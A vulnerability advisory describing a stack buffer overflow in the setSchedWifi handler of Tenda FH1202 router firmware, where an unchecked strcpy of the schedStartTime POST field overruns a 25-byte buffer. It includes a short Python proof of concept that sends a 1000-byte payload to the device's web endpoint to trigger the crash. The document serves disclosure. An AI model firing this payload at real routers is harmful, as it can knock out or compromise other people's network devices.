## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `src` variable receives the `schedStartTime` parameter from a POST request and is later assigned to the `ptr` variable, which is fixed at 25 bytes. However, since the user can control the input of `schedStartTime`, the statement `strcpy((char *)ptr + 2, src);` can cause a buffer overflow. The user-provided `schedStartTime` can exceed the capacity of the `ptr` array, triggering this security vulnerability.

![image-20240319134334271](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319134334271.png)

![image-20240319134305657](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319134305657.png)

![image-20240319134322756](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319134322756.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedStartTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319222906618.png)
